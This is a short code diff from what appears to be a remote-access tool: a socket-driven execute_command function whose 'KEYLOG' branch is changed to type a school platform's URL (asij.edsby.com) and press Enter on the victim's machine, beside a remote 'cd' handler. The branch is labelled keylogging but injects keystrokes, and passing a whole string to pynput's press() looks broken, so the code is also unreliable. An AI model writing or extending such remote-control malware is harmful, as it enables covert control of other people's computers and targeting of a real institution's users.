@@ -61,7 +61,10 @@ def execute_command(command, sock):
         #Keylogging command
         if command.startswith("KEYLOG"):
           keyboard = pynput.keyboard.Controller()
-          keyboard.press(pynput.keyboard.Key.a)
+          keyboard.press('https://asij.edsby.com/')
+          keyboard.release('https://asij.edsby.com/')
+          keyboard.press(pynput.keyboard.Key.enter)
+          keyboard.release(pynput.keyboard.Key.enter)
         # Special handling for "cd" command
         if command.startswith("cd "):
             try:
